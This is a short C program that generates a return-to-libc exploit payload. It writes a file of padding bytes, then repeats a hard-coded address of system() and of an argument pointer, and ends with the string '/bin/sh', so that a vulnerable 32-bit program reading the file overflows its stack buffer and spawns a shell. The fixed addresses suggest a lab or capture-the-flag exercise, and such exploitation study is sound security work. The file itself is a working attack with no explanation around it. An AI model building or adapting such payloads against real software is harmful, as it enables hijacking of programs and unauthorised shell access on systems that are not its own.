#include <stdio.h>

int main (int argc, const char * argv[]) {
	int i;
	FILE * fp = fopen("data.txt", "w");
	void * systemAddr = (void *)0xf7e6b250;
	void * argumentAddr = (void *)(0xffffcbcc + (0x40c - 556) + 4*7);
	for (i = 0; i < 556; i++) {
		fprintf(fp, "b");
	}
	//fprintf(fp, "cat %c", 0);
	//i += 9;
	for (i = i; i < 0x40c; i++) {
		fprintf(fp, "a");
	}
	fwrite((const char *)&systemAddr, 4, 1, fp);
	fwrite((const char *)&systemAddr, 4, 1, fp);
	fwrite((const char *)&argumentAddr, 4, 1, fp);
	fwrite((const char *)&argumentAddr, 4, 1, fp);
	fwrite((const char *)&argumentAddr, 4, 1, fp);
	fwrite((const char *)&argumentAddr, 4, 1, fp);
	fwrite((const char *)&argumentAddr, 4, 1, fp);
	fprintf(fp, "/bin/sh");
	// write the argument for system a few times to be safe
	fclose(fp);
	return 0;
}
